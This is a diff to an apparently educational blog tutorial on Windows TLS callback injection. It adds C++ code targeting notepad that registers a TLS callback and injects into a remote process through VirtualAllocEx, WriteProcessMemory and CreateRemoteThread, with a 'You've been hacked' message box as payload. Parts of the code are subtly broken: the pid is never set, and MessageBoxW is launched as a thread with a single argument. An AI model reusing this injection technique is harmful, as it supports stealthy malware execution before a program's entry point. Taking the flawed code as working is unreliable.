@@ -120,22 +120,168 @@ When example.exe is double-clicked or otherwise executed, the Windows loader beg
 The loader reads the PE header to determine the layout of the executable, including the location of different sections like .text (code), .data (initialized data), .rdata (read-only data), and .tls (Thread Local Storage).
 
 2. Setting Up Thread Local Storage (TLS)
-The loader identifies the .tls section based on the information in the PE header, specifically the IMAGE_TLS_DIRECTORY structure.
+The loader identifies the `.tls` section based on the information in the PE header, specifically the `IMAGE_TLS_DIRECTORY` structure.
 If the .tls section is present, the loader allocates memory for the TLS data for the initial thread (the main thread) of the process.
-The initial values for the TLS variables are copied from the .tls section in the PE file into the allocated memory for the main thread.
+The initial values for the TLS variables are copied from the `.tls` section in the PE file into the allocated memory for the main thread.
 
 3. Invoking TLS Callbacks
-If the .tls section includes a TLS Callbacks Array, the loader invokes each callback function in the array with the DLL_PROCESS_ATTACH reason.
+If the .tls section includes a TLS Callbacks Array, the loader invokes each callback function in the array with the `DLL_PROCESS_ATTACH` reason.
 These callbacks allow the application to perform any necessary initialization that must occur before the main code runs.
 Now i think that with this small knowledge, you can catch the coming part of the implementation.
 
 ## TLS Injection and how it works ?
 
+So referring to MITRE, TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point.
+
+- **How It Works**
+
+First we should identify the .tls Section that i explained before, which is designed to hold thread-specific data and TLS callbacks. After identifying the .tls, we can simply injects our malicious code by modifying TLS callback functions or creating new ones. These callbacks are executed automatically by the operating system during specific thread-related events (e.g., thread creation, thread termination).
+
+Lets see this in action.
+
+## Implementation
+
+So in this demo i will test the TLS callbacks injection on notepad and as usuall i will devide this to several steps.
+
+- **Needed libraries**
+
+```cpp
+#include "windows.h"
+#pragma comment(lib, "user32.lib")
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+```
+
+- **TLS Callback declaration**
+
+```cpp
+void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved);
+```
+
+This declares the TLS callback function, which is executed when the application starts, before the main function.
+In the NTAPI function, DllHandle is a parameter that represents a handle to the DLL. It is typically used in DLL functions to get the handle to the DLL instance that is being loaded or unloaded.
+Same for dwReason, which is a parameter that indicates the reason why the TLS callback is being called. It can have different values such as:
+
+`DLL_PROCESS_ATTACH`: The DLL is being loaded into the address space of the process.
+`DLL_THREAD_ATTACH`: A new thread is being created in the process.
+`DLL_THREAD_DETACH`: A thread is exiting cleanly.
+`DLL_PROCESS_DETACH`: The DLL is being unloaded from the address space of the process.
+
+- **Linker Specifications**
+
+```cpp
+#ifdef _M_IX86
+	#pragma comment (linker, "/INCLUDE:__tls_used")
+	#pragma comment (linker, "/INCLUDE:__tls_callback")
+#else
+	#pragma comment (linker, "/INCLUDE:_tls_used")
+	#pragma comment (linker, "/INCLUDE:_tls_callback")
+#endif
+
+#ifdef _M_X64
+    #pragma const_seg (".CRT$XLB")
+    const
+#else
+    #pragma data_seg (".CRT$XLB")
+#endif
+```
+
+Imagine you are developing a DLL that uses TLS to manage per-thread data. When this DLL is loaded into a process, the operating system needs to be aware of the TLS structures and callback functions so by including the `__tls_used` and `__tls_callback` symbols, we make sure that the necessary TLS initialization and callback mechanisms are correctly set up, incluing the architecture type.
 
 
+`PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks`
+This line declares a global variable _tls_callback of type PIMAGE_TLS_CALLBACK and initializes it with the address of the TLSCallbacks function. PIMAGE_TLS_CALLBACK is a pointer to a callback function that will be invoked during TLS operations.
 
+`#pragma const_seg (".CRT$XLB")`
+For 64-bit systems, this directive tells the compiler to place the subsequent data (_tls_callback) into a specific section named .CRT$XLB. This section is used to store TLS callback functions that need to be executed when certain events occur.
 
+`#pragma data_seg (".CRT$XLB")`
+Now same for 32-bit systems, it tells the compiler to place the subsequent data (_tls_callback) into a section named .CRT$XLB. Unlike 64-bit systems, this section might not be read-only.
 
+- **Injection**
+
+```cpp
+int injection(HANDLE handle_proc) {
+    // Define the message box parameters
+    const wchar_t *message = L"You've been hacked by sn4keEy3s";
+    const wchar_t *title = L"TLS Injection";
+    UINT uType = MB_OK;
+
+    // Allocate memory in the target process for the MessageBoxW parameters
+    SIZE_T message_len = (wcslen(message) + 1) * sizeof(wchar_t);
+    SIZE_T title_len = (wcslen(title) + 1) * sizeof(wchar_t);
+
+    // Allocate memory in the target process
+    LPVOID pMessage = VirtualAllocEx(handle_proc, NULL, message_len, MEM_COMMIT, PAGE_READWRITE);
+    LPVOID pTitle = VirtualAllocEx(handle_proc, NULL, title_len, MEM_COMMIT, PAGE_READWRITE);
+
+    if (pMessage == NULL || pTitle == NULL) {
+        return -1;
+    }
+
+    // Write the parameters to the allocated memory
+    WriteProcessMemory(handle_proc, pMessage, message, message_len, NULL);
+    WriteProcessMemory(handle_proc, pTitle, title, title_len, NULL);
+
+    // Get the address of MessageBoxW from user32.dll
+    HMODULE hUser32 = GetModuleHandle(L"user32.dll");
+    FARPROC pMessageBoxW = GetProcAddress(hUser32, "MessageBoxW");
+
+    if (pMessageBoxW == NULL) {
+        VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
+        VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
+        return -1;
+    }
+
+    // Create a remote thread in the target process that calls MessageBoxW
+    HANDLE hThread = CreateRemoteThread(handle_proc, NULL, 0, (LPTHREAD_START_ROUTINE)pMessageBoxW,
+                                        pMessage, 0, NULL);
+
+    if (hThread == NULL) {
+        VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
+        VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
+        return -1;
+    }
+
+    // Wait for the thread to finish
+    WaitForSingleObject(hThread, INFINITE);
+
+    // Clean up
+    CloseHandle(hThread);
+    VirtualFreeEx(handle_proc, pMessage, 0, MEM_RELEASE);
+    VirtualFreeEx(handle_proc, pTitle, 0, MEM_RELEASE);
+
+    return 0;
+}
+```
+
+So the Injection function takes as arguments the pid of the target process and as usuall we allocate space in the target memory space to write our malicious content, in our case we will trigger a message box.
+
+After that we defined our Injection function, lets set it in a Callback function to be executed. it simply fire up the injector.
+```
+void NTAPI __stdcall TLSCallbacks(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
+{
+	int pid = NULL;
+    HANDLE handle_proc = NULL;
+	
+
+	if (pid) {
+		MessageBoxW(NULL, L"Notepad Found", L"TLS injection", 0);
+		handle_proc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+						FALSE, (DWORD) pid);
+
+	if (handle_proc != NULL) {
+		
+		injection(handle_proc);
+		CloseHandle(handle_proc);
+		}
+	}
+
+	ExitProcess(0);
+}
 
 
 
